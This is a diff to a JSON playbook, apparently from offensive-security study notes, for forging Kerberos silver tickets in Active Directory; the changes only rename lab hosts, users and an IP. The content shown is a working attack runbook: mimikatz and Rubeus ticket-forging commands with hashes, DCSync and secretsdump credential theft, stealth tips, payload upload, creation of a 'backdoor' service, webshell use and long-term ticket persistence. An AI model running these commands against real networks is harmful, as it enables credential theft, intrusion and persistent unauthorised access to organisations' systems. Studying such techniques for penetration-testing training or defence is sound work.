@@ -36,10 +36,10 @@
             {
               "step": "1.2 Identify Target SPN",
               "commands": [
-                "setspn -Q */web04*",
-                "Get-NetUser -SPN | Where {$_.serviceprincipalname -match 'web04'}"
+                "setspn -Q */webserver*",
+                "Get-NetUser -SPN | Where {$_.serviceprincipalname -match 'webserver'}"
               ],
-              "output": "Service type (http, cifs, mssql), target server FQDN (web04.corp.com), service account (iis_service)",
+              "output": "Service type (http, cifs, mssql), target server FQDN (webserver.corp.com), service account (iis_service)",
               "notes": "Use EXACT hostname format from setspn output for /target parameter. Service type becomes /service parameter. Record service account name for step 1.3.",
               "time_estimate": "30-60 seconds",
               "related_commands": [
@@ -71,7 +71,7 @@
                   "method": "DCSync (if you already have Domain Admin)",
                   "commands": [
                     "mimikatz # lsadump::dcsync /domain:corp.com /user:iis_service",
-                    "impacket-secretsdump -just-dc-user iis_service 'corp.com/administrator:pass@192.168.50.70'"
+                    "impacket-secretsdump -just-dc-user iis_service 'corp.com/administrator:pass@10.10.10.70'"
                   ],
                   "notes": "Fastest method if DA already obtained. Extracts NTLM hash directly (no cracking).",
                   "time_estimate": "5-10 seconds"
@@ -91,17 +91,17 @@
           "steps": [
             {
               "step": "2.1 Create Silver Ticket with Mimikatz",
-              "command": "mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin /ptt",
+              "command": "mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:webserver.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:adminuser /ptt",
               "parameters": {
                 "/domain": "Target domain FQDN (corp.com not CORP)",
                 "/sid": "Domain SID WITHOUT RID (from step 1.1)",
-                "/target": "Server FQDN from setspn output (web04.corp.com)",
+                "/target": "Server FQDN from setspn output (webserver.corp.com)",
                 "/service": "SPN service type (http, cifs, mssql, ldap, host)",
                 "/rc4": "Service account NTLM hash (from step 1.3)",
                 "/user": "Impersonated username (can be ANY user, even fictional)",
                 "/ptt": "Pass-the-Ticket (auto-inject into current session)"
               },
-              "output": "Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session",
+              "output": "Golden ticket for 'adminuser @ corp.com' successfully submitted for current session",
               "notes": "Mimikatz calls Silver tickets 'Golden' in output (confusing but normal). Ticket is valid for 10 years by default. Mimikatz sets user as Domain Admin in forged PAC.",
               "time_estimate": "<30 seconds",
               "related_commands": [
@@ -110,7 +110,7 @@
             },
             {
               "step": "2.2 Alternative: Create Silver Ticket with Rubeus",
-              "command": "Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin /ptt",
+              "command": "Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:webserver.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:adminuser /ptt",
               "notes": "Rubeus is modern alternative with better OPSEC (supports AES encryption). Use /aes256:<key> instead of /rc4:<hash> for stealthier tickets. Use /nowrap for base64 output (easier to transfer tickets between machines).",
               "advantages": [
                 "Supports AES256/AES128 encryption",
@@ -133,7 +133,7 @@
               "step": "3.1 Verify Ticket in Cache",
               "command": "klist",
               "expected_output": [
-                "Server: http/web04.corp.com @ CORP.COM",
+                "Server: http/webserver.corp.com @ CORP.COM",
                 "KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)",
                 "Ticket Flags: 0x40a00000 -> forwardable renewable pre_authent",
                 "End Time: 10 years in future (e.g., 9/11/2032)"
@@ -149,39 +149,39 @@
               "service_specific_validation": {
                 "CIFS (File Shares)": {
                   "commands": [
-                    "dir \\\\web04.corp.com\\C$",
-                    "net view \\\\web04.corp.com /all",
-                    "copy payload.exe \\\\web04.corp.com\\C$\\Windows\\Temp\\"
+                    "dir \\\\webserver.corp.com\\C$",
+                    "net view \\\\webserver.corp.com /all",
+                    "copy payload.exe \\\\webserver.corp.com\\C$\\Windows\\Temp\\"
                   ],
                   "success": "Directory listing displayed, no access denied errors",
                   "failure": "Access denied \u2192 Wrong service type (need cifs ticket, not http)"
                 },
                 "HTTP (IIS, Web Apps)": {
                   "commands": [
-                    "Invoke-WebRequest http://web04.corp.com -UseDefaultCredentials",
-                    "iwr http://web04.corp.com/admin -UseDefaultCredentials"
+                    "Invoke-WebRequest http://webserver.corp.com -UseDefaultCredentials",
+                    "iwr http://webserver.corp.com/admin -UseDefaultCredentials"
                   ],
                   "success": "StatusCode: 200, Content populated, no auth prompts",
                   "failure": "401 Unauthorized \u2192 Verify FQDN in URL, http ticket exists, -UseDefaultCredentials flag used"
                 },
                 "MSSQL (SQL Server)": {
                   "commands": [
-                    "Invoke-Sqlcmd -ServerInstance web04.corp.com -Query 'SELECT @@VERSION'",
-                    "Invoke-Sqlcmd -ServerInstance web04.corp.com -Query \"EXEC xp_cmdshell 'whoami'\""
+                    "Invoke-Sqlcmd -ServerInstance webserver.corp.com -Query 'SELECT @@VERSION'",
+                    "Invoke-Sqlcmd -ServerInstance webserver.corp.com -Query \"EXEC xp_cmdshell 'whoami'\""
                   ],
                   "success": "SQL version string returned OR command output (if xp_cmdshell enabled)",
                   "failure": "Login failed \u2192 Check mssql ticket, use FQDN in ServerInstance, verify SQL user mapping"
                 },
                 "LDAP (Directory Services)": {
                   "commands": [
-                    "Get-ADUser -Server web04.corp.com -Filter *",
-                    "ldapsearch -H ldap://web04.corp.com -Y GSSAPI -b 'DC=corp,DC=com'"
+                    "Get-ADUser -Server webserver.corp.com -Filter *",
+                    "ldapsearch -H ldap://webserver.corp.com -Y GSSAPI -b 'DC=corp,DC=com'"
                   ],
                   "success": "AD objects returned, no credential errors",
                   "failure": "GSSAPI Error \u2192 Rare for Silver (use Golden for DC access), verify ldap ticket"
                 }
               },
-              "notes": "CRITICAL: Use FQDN (web04.corp.com) not NetBIOS (web04) for all validation. NetBIOS triggers NTLM, FQDN triggers Kerberos. Service type in ticket MUST match resource (http ticket for web, cifs ticket for SMB).",
+              "notes": "CRITICAL: Use FQDN (webserver.corp.com) not NetBIOS (webserver) for all validation. NetBIOS triggers NTLM, FQDN triggers Kerberos. Service type in ticket MUST match resource (http ticket for web, cifs ticket for SMB).",
               "time_estimate": "30-60 seconds per service type",
               "related_commands": [
                 "ad-silver-ticket-validate-access"
@@ -196,10 +196,10 @@
             {
               "scenario": "CIFS Ticket \u2192 Lateral Movement",
               "steps": [
-                "Upload payload: copy beacon.exe \\\\web04.corp.com\\C$\\Windows\\Temp\\",
-                "Execute via service: sc \\\\web04.corp.com create backdoor binpath= 'C:\\Windows\\Temp\\beacon.exe'",
-                "Start service: sc \\\\web04.corp.com start backdoor",
-                "Alternative: PsExec.exe \\\\web04.corp.com cmd.exe"
+                "Upload payload: copy beacon.exe \\\\webserver.corp.com\\C$\\Windows\\Temp\\",
+                "Execute via service: sc \\\\webserver.corp.com create backdoor binpath= 'C:\\Windows\\Temp\\beacon.exe'",
+                "Start service: sc \\\\webserver.corp.com start backdoor",
+                "Alternative: PsExec.exe \\\\webserver.corp.com cmd.exe"
               ],
               "notes": "CIFS ticket grants file system access. Use for payload delivery, remote admin (C$, ADMIN$ shares), or scheduled task creation.",
               "time_estimate": "2-5 minutes"
@@ -207,7 +207,7 @@
             {
               "scenario": "HTTP Ticket \u2192 Web Exploitation",
               "steps": [
-                "Access restricted admin panel: Invoke-WebRequest http://web04.corp.com/admin -UseDefaultCredentials",
+                "Access restricted admin panel: Invoke-WebRequest http://webserver.corp.com/admin -UseDefaultCredentials",
                 "Upload webshell via admin interface (authenticated with ticket)",
                 "Execute commands through webshell",
                 "Alternative: Exploit web vuln (SQLi, RCE) while authenticated"
@@ -235,9 +235,9 @@
             {
               "step": "5.1 Save Ticket for Later Use",
               "commands": [
-                "mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin (WITHOUT /ptt flag)",
-                "Output saved to: admin@http-web04.corp.com.kirbi",
-                "Transfer ticket off target: base64 -w 0 admin@http-web04.corp.com.kirbi OR scp to Kali"
+                "mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:webserver.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin (WITHOUT /ptt flag)",
+                "Output saved to: admin@http-webserver.corp.com.kirbi",
+                "Transfer ticket off target: base64 -w 0 admin@http-webserver.corp.com.kirbi OR scp to Kali"
               ],
               "notes": "Silver tickets are valid for 10 years by default. Ticket remains valid even if service account password changes (until service process restarts). Store .kirbi file securely for re-injection later.",
               "time_estimate": "1-2 minutes"
@@ -245,8 +245,8 @@
             {
               "step": "5.2 Re-inject Ticket Later",
               "commands": [
-                "mimikatz # kerberos::ptt admin@http-web04.corp.com.kirbi",
-                "Alternative (Rubeus): Rubeus.exe ptt /ticket:admin@http-web04.corp.com.kirbi"
+                "mimikatz # kerberos::ptt admin@http-webserver.corp.com.kirbi",
+                "Alternative (Rubeus): Rubeus.exe ptt /ticket:admin@http-webserver.corp.com.kirbi"
               ],
               "notes": "Return weeks/months later, inject ticket, access service transparently. No password/hash needed. Ticket becomes invalid ONLY if: 1) Service account deleted, 2) Service account password changed AND service restarted, 3) Kerberos policy enforces lifetime limits (rare).",
               "time_estimate": "<30 seconds"
@@ -267,7 +267,7 @@
         },
         "Server not found in Kerberos database": {
           "cause": "/target hostname doesn't match SPN registration",
-          "solution": "Run setspn -Q */targetserver* to get EXACT hostname. Use exact format from output (web04.corp.com, not WEB04 or web04).",
+          "solution": "Run setspn -Q */targetserver* to get EXACT hostname. Use exact format from output (webserver.corp.com, not WEBSERVER or webserver).",
           "prevention": "Always verify SPN with setspn BEFORE creating ticket. Copy/paste hostname directly from setspn output."
         },
         "Access denied after ticket injection": {
